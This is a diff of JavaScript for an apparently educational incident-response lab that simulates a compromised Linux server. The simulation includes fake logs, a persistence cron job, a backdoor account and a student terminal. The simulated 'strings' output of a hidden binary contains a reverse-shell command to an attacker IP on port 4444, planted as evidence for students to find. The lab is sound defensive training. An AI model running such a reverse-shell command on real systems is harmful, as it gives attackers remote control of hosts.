+  '/etc':                 { v:['passwd','shadow','crontab','cron.d'],          h:[],                                      p:'/' },
+  '/etc/cron.d':          { v:['anacron','php','svc_backup_task'],             h:[],                                      p:'/etc' },
+  '/tmp':                 { v:['tmpPzQ3x1'],                                   h:['.update_check'],                       p:'/' },
+  '/var':                 { v:['log'],                                         h:[],                                      p:'/' },
+  '/var/log':             { v:['auth.log','syslog'],                           h:[],                                      p:'/var' },
+  '/home':                { v:['analyst','jreyes','billing_svc','dev_marcus','svc_backup'], h:[],                         p:'/' },
+  '/home/analyst':        { v:['logs','notes.txt','Desktop','Documents'],      h:['.bash_history','.bashrc','.bash_logout'], p:'/home' },
+  '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
+  '/home/jreyes':         { v:[],                                              h:['.bash_history','.bashrc'],             p:'/home' },
+  '/home/svc_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
+  '/home/billing_svc':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
+  '/home/dev_marcus':     { v:[],                                              h:['.bashrc','.bash_history'],             p:'/home' },
+  '/bin':                 { v:['bash','sh','ls','cat','grep','ps'],            h:[],                                      p:'/' },
+  '/usr':                 { v:['bin','sbin','local'],                          h:[],                                      p:'/' },
+};
+
+// File contents keyed by absolute path
+const termFiles = {
+  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+jreyes:x:1000:1000:Jordan Reyes,,,:/home/jreyes:/bin/bash
+billing_svc:x:1001:1001:Billing Service Account,,,:/home/billing_svc:/bin/bash
+dev_marcus:x:1002:1002:Marcus (Dev),,,:/home/dev_marcus:/bin/bash
+analyst:x:1003:1003:SOC Analyst (you),,,:/home/analyst:/bin/bash
+svc_backup:x:1004:0:,,,:/home/svc_backup:/bin/bash
+contractor_q1:x:1005:1005:Q1 Contractor,,,:/home/contractor_q1:/bin/bash`,
+  '/etc/shadow': 'cat: /etc/shadow: Permission denied',
+  '/etc/crontab': `# /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user   command
+17 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6   * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6   * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )`,
+  '/etc/cron.d/svc_backup_task': `# Added by system
+*/5 * * * * root /tmp/.update_check 2>/dev/null`,
+  '/etc/cron.d/anacron': '# standard anacron job',
+  '/etc/cron.d/php': '# php session cleanup',
+  '/tmp/.update_check': 'bash: /tmp/.update_check: Permission denied (execute only)',
+  '/tmp/tmpPzQ3x1': `# tmpPzQ3x1 — staging file
+timestamp=1716042783
+status=ok`,
+  '/var/log/auth.log': `[showing last 20 lines — use grep for specific patterns]
+May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2
+May 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2
+May 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2
+May 18 01:53:28 clearpath-prod-01 sshd[3204]: Failed password for root from 185.220.101.42 port 30004 ssh2
+May 18 01:54:01 clearpath-prod-01 sshd[3205]: Failed password for root from 185.220.101.42 port 30005 ssh2
+...
+[47 total failed attempts — use grep to analyze]
+...
+May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2
+May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session opened for user root
+May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0, home=/home/svc_backup
+May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'svc_backup' to group 'sudo'
+May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`,
+  '/var/log/syslog': `May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:19:55 clearpath-prod-01 CRON[3301]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:24:55 clearpath-prod-01 CRON[3341]: (root) CMD (/tmp/.update_check 2>/dev/null)`,
+  '/home/analyst/.bash_history': `# .bash_history (last 3 entries only — earlier entries deleted)
+ls /tmp
+cat /etc/passwd
+history -c`,
+  '/home/analyst/.bashrc': '# ~/.bashrc: executed by bash(1) for non-login shells.',
+  '/home/analyst/notes.txt': `SOC Investigation Notes — analyst
+Started: Mon May 18 08:31
+- Received alert about multiple failed SSH logins overnight
+- Need to check auth.log and cron jobs
+- Jordan says backups run at 2am — verify if legit`,
+  '/home/analyst/logs/access.log': `10.0.0.5 - jreyes [18/May/2026:08:03:44 +0000] "GET /billing/dashboard HTTP/1.1" 200 4821
+10.0.0.5 - jreyes [18/May/2026:08:04:12 +0000] "GET /billing/reports HTTP/1.1" 200 9302
+185.220.101.42 - - [18/May/2026:02:15:01 +0000] "GET /admin HTTP/1.1" 403 512
+185.220.101.42 - - [18/May/2026:02:15:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 209
+185.220.101.42 - - [18/May/2026:02:15:08 +0000] "POST /admin/login HTTP/1.1" 302 0`,
+  '/home/analyst/logs/error.log': `[Mon May 18 02:15:08 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/admin
+[Mon May 18 02:15:09 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/phpmyadmin`,
+  '/home/svc_backup/.bash_history': `# .bash_history — svc_backup
+whoami
+id
+cat /etc/passwd
+uname -a`,
+};
+
+// Resolve a path (absolute or relative) against cwd. Returns absolute path.
+function resolvePath(arg) {
+  if(!arg || arg === '~') return '/home/analyst';
+  if(arg.startsWith('~/')) return '/home/analyst/' + arg.slice(2);
+  if(arg.startsWith('/')) return arg.replace(/\/+$/, '') || '/';
+  // relative
+  const base = termCwd === '/' ? '' : termCwd;
+  const parts = (base + '/' + arg).split('/').filter(Boolean);
+  const stack = [];
+  for(const p of parts) {
+    if(p === '..') stack.pop();
+    else if(p !== '.') stack.push(p);
+  }
+  return '/' + stack.join('/');
+}
+
+function termPrompt() {
+  const display = termCwd === '/home/analyst' ? '~' : termCwd;
+  return `analyst@clearpath-prod-01:${display}$`;
+}
+
+function updatePromptLabel() {
+  const el = document.getElementById('terminal-prompt-label');
+  if(el) el.textContent = termPrompt();
+}
+
+function appendTermLine(text, cls, promptSnapshot) {
+  const out = document.getElementById('terminal-output');
+  const div = document.createElement('div');
+  div.className = 'term-line';
+  if(cls === 'term-output') {
+    div.innerHTML = `<span class="${cls}">${text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>`;
+  } else {
+    const escaped = text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    div.innerHTML = `<span class="term-prompt">${promptSnapshot || termPrompt()}</span> <span class="term-cmd">${escaped}</span>`;
+  }
+  out.appendChild(div);
+  out.scrollTop = out.scrollHeight;
+}
+
+function handleTerminal(e) {
+  if(e.key === 'Enter') {
+    const input = document.getElementById('terminal-input');
+    const cmd = input.value.trim();
+    if(!cmd) return;
+    termHistory.unshift(cmd);
+    termHistIdx = -1;
+    input.value = '';
+    const promptBefore = termPrompt();
+    appendTermLine(cmd, 'term-cmd', promptBefore);
+    const result = runTermCmd(cmd);
+    if(result !== null && result !== undefined) appendTermLine(result, 'term-output');
+  } else if(e.key === 'ArrowUp') {
+    e.preventDefault();
+    if(termHistory.length > 0 && termHistIdx < termHistory.length - 1) termHistIdx++;
+    document.getElementById('terminal-input').value = termHistIdx >= 0 ? (termHistory[termHistIdx] || '') : '';
+  } else if(e.key === 'ArrowDown') {
+    e.preventDefault();
+    if(termHistIdx > 0) termHistIdx--;
+    else termHistIdx = -1;
+    document.getElementById('terminal-input').value = termHistIdx >= 0 ? (termHistory[termHistIdx] || '') : '';
+  }
+}
+
+function runTermCmd(raw) {
+  const cmd = raw.trim();
+  const lower = cmd.toLowerCase();
+  const parts = cmd.split(/\s+/);
+  const verb = parts[0].toLowerCase();
+
+  // ── cd ──────────────────────────────────────────────────────────────────
+  if(verb === 'cd') {
+    const arg = parts.slice(1).join(' ').trim();
+    const target = arg ? resolvePath(arg) : '/home/analyst';
+    if(termFS[target]) { termCwd = target; updatePromptLabel(); return null; }
+    return `bash: cd: ${arg}: No such file or directory`;
+  }
+
+  // ── pwd ──────────────────────────────────────────────────────────────────
+  if(lower === 'pwd') return termCwd;
+
+  // ── ls ───────────────────────────────────────────────────────────────────
+  if(verb === 'ls') {
+    // find flags and path arg
+    const flags = parts.slice(1).filter(p => p.startsWith('-')).join('');
+    const pathArg = parts.slice(1).find(p => !p.startsWith('-'));
+    const target = pathArg ? resolvePath(pathArg) : termCwd;
+    const dir = termFS[target];
+    if(!dir) return `ls: cannot access '${pathArg || termCwd}': No such file or directory`;
+    const showHidden = flags.includes('a');
+    const longFmt    = flags.includes('l');
+    const files = showHidden ? [...dir.v, ...dir.h] : dir.v;
+    if(!longFmt) return files.length ? files.join('  ') : '';
+    const now = 'May 18 08:31';
+    return 'total ' + (files.length * 4 + 8) + '\n' +
+      'drwxr-xr-x 1 root    root    4096 ' + now + ' .\n' +
+      'drwxr-xr-x 1 root    root    4096 ' + now + ' ..\n' +
+      files.map(f => {
+        const fp = (target === '/' ? '/' : target + '/') + f;
+        const isDir = !!termFS[fp];
+        const isDot = f.startsWith('.');
+        const isRoot = (f === '.update_check');
+        const perm  = isDot ? (isDir ? 'drwx------' : '-rw-------') : (isDir ? 'drwxr-xr-x' : '-rw-r--r--');
+        const owner = isRoot ? 'root    root   8192' : 'analyst analyst  512';
+        return `${perm} 1 ${owner} ${now} ${f}`;
+      }).join('\n');
+  }
+
+  // ── cat ──────────────────────────────────────────────────────────────────
+  if(verb === 'cat') {
+    const pathArg = parts.slice(1).find(p => !p.startsWith('-'));
+    if(!pathArg) return 'cat: missing operand';
+    const target = resolvePath(pathArg);
+    if(termFiles[target] !== undefined) return termFiles[target];
+    if(termFS[target]) return `cat: ${pathArg}: Is a directory`;
+    return `cat: ${pathArg}: No such file or directory`;
+  }
+
+  // ── strings ───────────────────────────────────────────────────────────────
+  if(verb === 'strings') {
+    const target = resolvePath(parts[1] || '');
+    if(target === '/tmp/.update_check') return `/bin/sh\n/bin/bash\n185.220.101.42\n4444\nbash -i >& /dev/tcp/185.220.101.42/4444 0>&1\nconnect\nsocket\nexecve`;
+    return `strings: ${parts[1]}: No such file or directory`;
+  }
+
+  // ── file ──────────────────────────────────────────────────────────────────
+  if(verb === 'file') {
+    const target = resolvePath(parts[1] || '');
+    if(target === '/tmp/.update_check') return '/tmp/.update_check: ELF 64-bit LSB executable, x86-64, dynamically linked';
+    if(termFS[target]) return `${parts[1]}: directory`;
+    if(termFiles[target]) return `${parts[1]}: ASCII text`;
+    return `file: ${parts[1]}: No such file or directory`;
+  }
+
+  // ── grep ──────────────────────────────────────────────────────────────────
+  if(verb === 'grep') {
+    const gLower = lower;
+    if(gLower.includes('failed') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\nMay 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2\nMay 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2\n[... 44 more failed attempts from 185.220.101.42 ...]\nMay 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2`;
+    if(gLower.includes('accept') && gLower.includes('auth.log')) return `May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2\nMay 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`;
+    if(gLower.includes('svc_backup') && gLower.includes('auth.log')) return `May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
+    if(gLower.includes('185.220') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\n[... 46 more lines from 185.220.101.42 ...]\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
+    return `grep: no matches found`;
+  }
+
+  // ── nmap ──────────────────────────────────────────────────────────────────
+  if(verb === 'nmap') {
+    if(parts.length === 1) return `Usage: nmap [options] target\nTry: nmap localhost  or  nmap -sV localhost  or  nmap -sV -sC localhost`;
+    const hasV = lower.includes('-sv');
+    const hasC = lower.includes('-sc');
+    const target = parts[parts.length-1];
+    const ip = (target === 'localhost' || target === '127.0.0.1') ? '127.0.0.1' : '10.0.0.4';
+    const host = ip === '127.0.0.1' ? 'localhost' : 'clearpath-prod-01 (10.0.0.4)';
+    let out = `Starting Nmap 7.80\nNmap scan report for ${host}\nHost is up (0.00008s latency).\nNot shown: 997 closed ports\n`;
+    if(hasV) {
+      out += `PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n3306/tcp open  mysql   MySQL 8.0.36-0ubuntu0.22.04.1\n`;
+      if(hasC) out += `\nWARNING: Port 3306 (MySQL) is accessible from outside — no firewall rule blocking this port.\n`;
+    } else {
+      out += `PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n`;
+    }
+    out += `\nNmap done: 1 IP address (1 host up)`;
+    return out;
+  }
+
+  // ── simple built-ins ──────────────────────────────────────────────────────
+  const builtins = {
+    'whoami':       'analyst',
+    'hostname':     'clearpath-prod-01',
+    'uname -a':     'Linux clearpath-prod-01 5.15.0-100-generic #110-Ubuntu SMP x86_64 GNU/Linux',
+    'uname':        'Linux',
+    'date':         'Mon May 18 08:31:44 UTC 2026',
+    'uptime':       ' 8:31am  up 47 days,  3:22,  2 users,  load average: 0.08, 0.12, 0.10',
+    'id':           'uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)',
+    'crontab -l':   '# Analyst crontab — nothing scheduled\nno crontab for analyst',
+    'crontab -l -u root': 'crontab: must be privileged to use -u',
+    'last':         'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\n\nwtmp begins Tue Apr  1 09:00:00 2026',
+    'last -20':     'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\nbilling_svc pts/0     10.0.0.8         Fri May 16 07:55 - 08:40  (00:45)\njreyes   pts/0        10.0.0.5         Thu May 15 09:11 - 17:02  (07:51)',
+    'ps aux':       'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  22520  1024 ?        Ss   Apr01   0:04 /sbin/init\nroot       412  0.0  0.3  72184  3200 ?        Ss   Apr01   0:00 /usr/sbin/sshd -D\nroot      3847  0.0  0.1   4628  1024 ?        Ss   02:14   0:00 /tmp/.update_check\nroot      3849  0.0  0.0      0     0 ?        S    02:14   0:00 bash -i\nmysql     1203  0.0  2.1 558432 21448 ?        Ssl  Apr01   3:11 /usr/sbin/mysqld\nwww-data  1301  0.0  0.5 287612  5120 ?        Ss   Apr01   0:01 /usr/sbin/apache2\nanalyst   4201  0.0  0.1  21316  1024 pts/0    Ss   08:31   0:00 -bash\nanalyst   4298  0.0  0.0  37368   772 pts/0    R+   08:31   0:00 ps aux',
+    'netstat -an':  'Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp        0    128 10.0.0.4:22             185.220.101.42:31337    ESTABLISHED\ntcp        0      0 10.0.0.4:54321          185.220.101.42:4444     ESTABLISHED',
+    'ss -tuln':     'Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128          0.0.0.0:22        0.0.0.0:*\ntcp    LISTEN  0       80           0.0.0.0:80        0.0.0.0:*\ntcp    LISTEN  0       70         127.0.0.1:3306      0.0.0.0:*',
+    'history':      '    1  ls\n    2  cat /etc/passwd\n    3  ls /tmp\n    4  history -c\n    5  ls -la\n    6  history',
+    'sudo su':      'sudo: This incident is under investigation. Privilege escalation has been restricted.',
+    'sudo -l':      '[sudo] password for analyst:\nSorry, user analyst may not run sudo on clearpath-prod-01.',
+    'exit':         'Session remains open for investigation.',
+    'help':         'Available commands:\nNavigation: cd <path>, cd .., cd ~, pwd, ls, ls -a, ls -la\nFiles:       cat <file>, strings <file>, file <file>\nNetwork:     netstat -an, ss -tuln, nmap localhost, nmap -sV localhost, nmap -sV -sC localhost\nLogs:        cat /var/log/auth.log, grep -i "failed" /var/log/auth.log, grep -i "accepted" /var/log/auth.log\nSystem:      whoami, id, hostname, uname -a, uptime, date, ps aux, last, history\nScheduled:   crontab -l, cat /etc/crontab, ls /etc/cron.d\nOther:       clear\n\nTIP: cd accepts any path — try "cd /var/log" or "cd .." or "cd ~"\nTIP: ls only shows visible files. Use "ls -a" to reveal hidden dot files.',
+  };
+
+  if(builtins[lower] !== undefined) return builtins[lower];
+  if(builtins[cmd]   !== undefined) return builtins[cmd];
+
+  if(lower === 'clear') { document.getElementById('terminal-output').innerHTML = ''; return null; }
+
+  return `bash: ${verb}: command not found`;
+}
+
+// ===================== AUTH.LOG DOWNLOAD =====================
+function downloadAuthLog() {
+  let lines = [];
+  // generate realistic auth.log
+  const ip = '185.220.101.42';
+  const base = new Date('2026-05-18T01:52:04');
+  for(let i=0; i<47; i++) {
+    const t = new Date(base.getTime() + i * 27000);
+    const ts = t.toLocaleString('en-US',{month:'short',day:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}).replace(',','');
+    lines.push(`May ${String(t.getDate()).padStart(2)} ${String(t.getHours()).padStart(2,'0')}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')} clearpath-prod-01 sshd[${3200+i}]: Failed password for root from ${ip} port ${30001+i} ssh2`);
+  }
+  lines.push(`May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from ${ip} port 31337 ssh2`);
+  lines.push(`May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session opened for user root by (uid=0)`);
+  lines.push(`May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0`);
+  // add some noise
+  lines.push(`May 17 23:41:02 clearpath-prod-01 sshd[2901]: Failed password for admin from 45.33.32.156 port 22341 ssh2`);
+  lines.push(`May 17 23:41:05 clearpath-prod-01 sshd[2901]: Failed password for admin from 45.33.32.156 port 22342 ssh2`);
+  lines.push(`May 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`);
+  lines.push(`May 18 08:03:11 clearpath-prod-01 sshd[4100]: pam_unix(sshd:session): session opened for user jreyes by (uid=0)`);
+  lines.push(`May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from ${ip} port 31338 ssh2`);
+  const blob = new Blob([lines.join('\n')], {type:'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'auth.log'; a.click();
+}
+
+// ===================== SAVE MY WORK =====================
+async function saveMyWork() {
+  const statusEl = document.getElementById('autosave-status');
+  if(statusEl) statusEl.textContent = 'Exporting...';
+
+  const fieldIds = [
+    'siem-notes','terminal-notes',
+    'python-output','python-bugs','python-q1','python-q2','python-q3','python-q4',
+    'pb-name','pb-datetime','pb-analyst','pb-class','pb-severity','pb-desc',
+    'pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
+    'pb-respond','pb-notify','pb-recover','pb-improve',
+    'rpt-analyst','rpt-date','rpt-client','rpt-class',
+    'rpt-exec','rpt-timeline',
+    'rpt-f1','rpt-f2','rpt-f3','rpt-f4','rpt-f5',
+    'rpt-nist','rpt-controls',
+    'rpt-rec-imm','rpt-rec-short','rpt-rec-long',
+    'rpt-hipaa','rpt-ethics','rpt-ethical-reasoning',
+    'nb-freeform','nb-iocs','nb-timeline','nb-questions','nb-controls',
+  ];
+
+  // Build a script block that pre-fills fields on load
+  let prefillScript = '<script id="prefill-data">\ndocument.addEventListener("DOMContentLoaded", function() {\n';
+  fieldIds.forEach(id => {
+    const el = document.getElementById(id);
+    if(el) {
+      const v = el.value.replace(/\\/g,'\\\\').replace(/`/g,'\\`').replace(/\$/g,'\\$');
+      if(el.tagName === 'SELECT') {
+        prefillScript += `  var s = document.getElementById(${JSON.stringify(id)}); if(s) s.value = \`${v}\`;\n`;
+      } else {
+        prefillScript += `  var e = document.getElementById(${JSON.stringify(id)}); if(e) e.value = \`${v}\`;\n`;
+      }
+    }
+  });
+  const coveredArr = Array.from(jordanCovered);
+  prefillScript += `  var jc = ${JSON.stringify(coveredArr)};\n`;
+  prefillScript += `  jc.forEach(function(t){ var el = document.getElementById(t); if(el) el.classList.add('found'); });\n`;
+  prefillScript += `  window._restoredJordanCovered = jc;\n`;
+  prefillScript += '});\n<\/script>';
+
+  // Fetch the clean source file rather than serializing the live DOM,
+  // which blocks the main thread on a large page with sql.js loaded.
+  let html;
+  try {
+    const resp = await fetch(location.href, { cache: 'no-store' });
+    html = await resp.text();
+  } catch(e) {
+    // Fallback for local/offline use — yield first so the UI can update
+    await new Promise(r => setTimeout(r, 0));
+    html = document.documentElement.outerHTML;
+  }
+
+  const cleaned = html.replace(/<script id="prefill-data">[\s\S]*?<\/script>/g, '');
+  const saved = cleaned.replace('</body>', prefillScript + '\n</body>');
+
+  const blob = new Blob([saved], {type:'text/html'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  const name = (document.getElementById('rpt-analyst').value || '').trim().replace(/\s+/g,'_') || 'student';
+  a.download = `operation_silent_pivot_${name}.html`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+
+  if(statusEl) {
+    statusEl.textContent = 'Exported!';
+    setTimeout(() => { statusEl.textContent = 'Autosave active'; }, 2000);
+  }
+}
+
+// ===================== PHASE HINTS =====================
+const siemHints = [
+  "Think about what a SIEM is designed to do — it collects and correlates security events. What tables are available to you, and what kinds of events would you expect to see before, during, and after an unauthorized access?",
+  "Consider what patterns in the data might indicate malicious behavior versus normal activity. Authentication events, user account changes, and database activity are all worth examining separately.",
+  "Think about what questions you'd want answered: Who logged in? From where? At what time? Did anything unusual happen to user accounts? What was accessed in the database?",
+];
+
+const termHints = [
+  "A thorough system investigation covers several areas: who has access, what is running, what is scheduled, and what files exist that shouldn't. Think about what an attacker would need to do to maintain access after breaking in.",
+  "Consider the full lifecycle of an intrusion: gaining access, establishing persistence, and covering tracks. Each stage leaves different kinds of artifacts in different places on the system.",
+  "Look beyond the obvious places. Attackers don't always leave files in home directories — think about where a process would need to be to run automatically, and where temporary files are typically stored on Linux.",
+  "On Linux, files that start with a dot (.) are hidden from a normal 'ls' listing. Try 'ls -a' in directories like /tmp and home folders — you might find something that plain 'ls' doesn't show.",
+];
+
+const pyHints = [
+  "Before trying to fix anything, open auth.log and read a few lines manually. Then read the script line by line and ask: what is each line actually doing? Does the script's logic match what you see in the log file?",
+  "One of the bugs is about what the script is looking for in each line — is it searching for the right kind of event? Another bug is about how it extracts information from a line — try printing a split line to see what index each word lands on.",
+  "One bug makes the script produce no output even when it runs. Think about the threshold: if the correct number of attempts is somewhere between 10 and 100, what threshold would cause the script to silently skip every result? The last bug is about what gets printed — is a count on its own useful to an analyst?",
+];
+
+const hintCounters = {};
+function showHint(containerId, hints) {
+  if(!hintCounters[containerId]) hintCounters[containerId] = 0;
+  const idx = hintCounters[containerId];
+  if(idx >= hints.length) {
+    const container = document.getElementById(containerId);
+    const msg = document.createElement('div');
+    msg.className = 'alert alert-yellow';
+    msg.style.fontSize = '13px';
+    msg.innerHTML = 'No more hints available. Review your notes and try a different approach.';
+    if(!container.querySelector('.no-more-hints')) { msg.classList.add('no-more-hints'); container.appendChild(msg); }
+    return;
+  }
+  const container = document.getElementById(containerId);
+  const div = document.createElement('div');
+  div.className = 'alert alert-yellow';
+  div.style.fontSize = '13px';
+  div.innerHTML = `<strong>Hint ${idx + 1}:</strong> ${hints[idx]}`;
+  container.appendChild(div);
+  hintCounters[containerId]++;
+}
+
+// ===================== AUTOSAVE =====================
+const SAVE_KEY = 'op_silent_pivot_save';
+const ALL_FIELD_IDS = [
+  'siem-notes','terminal-notes',
+  'python-output','python-bugs','python-q1','python-q2','python-q3','python-q4',
+  'pb-name','pb-datetime','pb-analyst','pb-class','pb-severity','pb-desc',
+  'pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
+  'pb-respond','pb-notify','pb-recover','pb-improve',
+  'rpt-analyst','rpt-date','rpt-client','rpt-class',
+  'rpt-exec','rpt-timeline',
+  'rpt-f1','rpt-f2','rpt-f3','rpt-f4','rpt-f5',
+  'rpt-nist','rpt-controls',
+  'rpt-rec-imm','rpt-rec-short','rpt-rec-long',
+  'rpt-hipaa','rpt-ethics','rpt-ethical-reasoning',
+  'nb-freeform','nb-iocs','nb-timeline','nb-questions','nb-controls',
+];
+
+function autoSave() {
+  const data = { savedAt: new Date().toISOString() };
+  ALL_FIELD_IDS.forEach(id => {
+    const el = document.getElementById(id);
+    if(el) data[id] = el.value;
+  });
+  try {
+    localStorage.setItem(SAVE_KEY, JSON.stringify(data));
+    const el = document.getElementById('autosave-status');
+    if(el) {
+      const t = new Date();
+      el.textContent = `Autosaved ${t.getHours()}:${String(t.getMinutes()).padStart(2,'0')}:${String(t.getSeconds()).padStart(2,'0')}`;
+      el.style.color = '#3fb950';
+      setTimeout(() => { if(el) el.style.color = '#a8b8d0'; }, 2000);
+    }
+  } catch(e) { /* localStorage may be unavailable */ }
+}
+
+function autoRestore() {
+  try {
+    const raw = localStorage.getItem(SAVE_KEY);
+    if(!raw) return;
+    const data = JSON.parse(raw);
+    let restored = 0;
+    ALL_FIELD_IDS.forEach(id => {
+      if(data[id] !== undefined) {
+        const el = document.getElementById(id);
+        if(el) { el.value = data[id]; restored++; }
+      }
+    });
+    if(restored > 0 && data.savedAt) {
+      const el = document.getElementById('autosave-status');
+      const t = new Date(data.savedAt);
+      if(el) el.textContent = `Restored save from ${t.toLocaleTimeString()}`;
+    }
+  } catch(e) { /* ignore */ }
+}
+
+function clearSave() {
+  if(confirm('Clear all saved progress? This cannot be undone.')) {
+    localStorage.removeItem(SAVE_KEY);
+    ALL_FIELD_IDS.forEach(id => {
+      const el = document.getElementById(id);
+      if(el) {
+        if(el.tagName === 'SELECT') el.selectedIndex = 0;
+        else el.value = '';
+      }
+    });
+    document.getElementById('autosave-status').textContent = 'Progress cleared';
+  }
+}
+
+// ===================== INIT =====================
+document.addEventListener('DOMContentLoaded', () => {
+  initSiem();
+  autoRestore();   // restore fields first
+  jordanOpen();    // then init Jordan (reads restored fields if any)
+  // populate PDF cover from report fields on print
+  window.addEventListener('beforeprint', () => {
+    document.getElementById('cv-analyst').textContent = document.getElementById('rpt-analyst').value || '(not filled)';
+    document.getElementById('cv-date').textContent = document.getElementById('rpt-date').value || '(not filled)';
+    document.getElementById('cv-client').textContent = document.getElementById('rpt-client').value || 'ClearPath Medical Billing, LLC';
+    document.getElementById('cv-class').textContent = document.getElementById('rpt-class').value || 'CONFIDENTIAL';
+  });
+
+  // autosave every 60 seconds
+  setInterval(autoSave, 60000);
+  // autosave on field changes (debounced)
+  let saveTimer;
+  ALL_FIELD_IDS.forEach(id => {
+    const el = document.getElementById(id);
+    if(el) el.addEventListener('input', () => { clearTimeout(saveTimer); saveTimer = setTimeout(autoSave, 3000); });
+  });
+
+  const out = document.getElementById('terminal-output');
+  out.innerHTML = `<div class="term-line"><span class="term-output">Welcome to clearpath-prod-01 (Ubuntu 22.04.4 LTS)
+Last login: Sun May 18 08:03:11 2026 from 10.0.0.5
+
+  === NOTICE: This system is under active investigation ===
+  === Authorized SOC analyst access only               ===
+
+Type 'help' for a list of available commands.
+</span></div>`;
+});
+
+window.addEventListener('beforeprint', function() {
+  document.querySelectorAll('textarea.report-field').forEach(function(ta) {
+    ta.style.height = ta.scrollHeight + 'px';
+    ta.style.overflow = 'visible';
+  });
+});
+window.addEventListener('afterprint', function() {
+  document.querySelectorAll('textarea.report-field').forEach(function(ta) {
+    ta.style.height = '';
+    ta.style.overflow = '';
+  });
+});
+</script>
+</body>
+</html>
